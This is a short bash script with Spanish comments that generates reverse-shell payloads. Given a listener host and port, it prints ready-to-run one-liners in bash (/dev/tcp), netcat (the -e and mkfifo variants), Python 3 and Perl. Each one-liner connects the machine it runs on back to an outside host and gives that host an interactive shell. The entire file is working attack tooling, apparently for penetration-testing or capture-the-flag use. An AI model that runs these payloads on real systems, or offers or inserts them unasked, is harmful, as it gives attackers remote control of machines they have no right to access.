#!/usr/bin/env bash
# RevShell Gen (A) – Catálogo directo
# Uso: ./revshell_a.sh 10.10.14.7 4444

set -euo pipefail
LHOST="${1:-}"; LPORT="${2:-}"
[[ -z "$LHOST" || -z "$LPORT" ]] && { echo "Uso: $0 <LHOST> <LPORT>"; exit 1; }

cat <<EOF
# bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

# nc (tradicional)
nc -e /bin/sh $LHOST $LPORT

# nc (mkfifo)
mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc $LHOST $LPORT > /tmp/p

# python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$LHOST",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

# perl
perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
EOF
